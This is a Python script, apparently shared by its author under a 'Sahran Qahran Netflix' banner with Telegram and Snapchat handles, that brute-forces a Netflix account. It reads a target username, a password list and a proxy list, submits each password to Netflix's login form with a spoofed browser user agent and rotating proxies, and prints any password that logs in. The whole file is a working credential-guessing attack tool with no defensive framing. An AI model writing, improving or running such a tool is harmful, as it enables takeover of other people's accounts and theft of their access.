import mechanize
import sys
from proxylist import ProxyList
import logging
import winsound

print('''
 
        -------------------------------------
               Sahran Qahran Netflix
        -------------------------------------
        * -> Development: 0xfff0800          *
        * -> Telegram: https://T.me/xfff0800 *
        * -> snapchat: flaah999              *
        **************************************                                                 
''')
winsound.PlaySound("f", winsound.SND_FILENAME)
b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                 )]

username = input('User or Email : ')
passwordList = input('password-List : ')
proxyList = input('proxy-List : ')


def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit('[!] Proxy File format has incorrect | EXIT...')
    pl.random()
    getProxy = pl.random().address()
    b.set_proxies(proxies={"https": getProxy})
    try:
        checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=10)
    except:
        return proxy()


def netflix():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("Target Account: {}".format(username))
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0
        sys.stdout.write('\r[-] {} [-] '.format(password))
        sys.stdout.flush()
        url = "https://www.netflix.com/sa-en/Login"
        try:
            b.open(url, timeout=10)
            b.select_form(nr=0)
            b.form['userLoginId'] = username
            b.form['password'] = password
            b.method = "POST"
            submit = b.submit()


            if 'https://www.netflix.com/browse' in  submit.geturl():
                print(f'\n\033[1;31m [+] Good ^_^ [{username}]:[{password}] [+] \033[1;31m')
                winsound.PlaySound("dd", winsound.SND_FILENAME)
                proxy()
                break
            else:
                print(' NO !')
        except :
            print('\n ok exit ')
            sys.stdout.flush()
            proxy()
            break


if __name__ == '__main__':
    netflix()
    proxy()
